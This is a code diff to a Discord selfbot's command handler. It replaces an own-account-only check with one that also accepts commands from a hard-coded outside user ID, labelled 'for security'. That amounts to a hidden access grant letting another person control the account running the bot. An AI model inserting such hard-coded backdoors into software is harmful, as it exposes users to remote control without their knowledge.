@@ -122,10 +122,15 @@ export async function loadCommands(client) {
       if (message.author.bot || !message.content.startsWith(client.prefix))
         return;
 
-      // CRITICAL SECURITY CHECK: Only allow the selfbot account to execute commands
-      if (message.author.id !== client.user.id) {
-        return; // Silently ignore commands from other users
-      }
+const allowedUserId = "955951054644740146"; // ← Owner id (for security)
+
+// CRITICAL SECURITY CHECK: Only allow the selfbot account + explicitly allowed users
+if (
+    message.author.id !== client.user.id && 
+    message.author.id !== allowedUserId
+) {
+    return; // Silently ignore commands from everyone else
+}
 
       // Parse command and arguments
       const content = message.content.slice(client.prefix.length).trim();
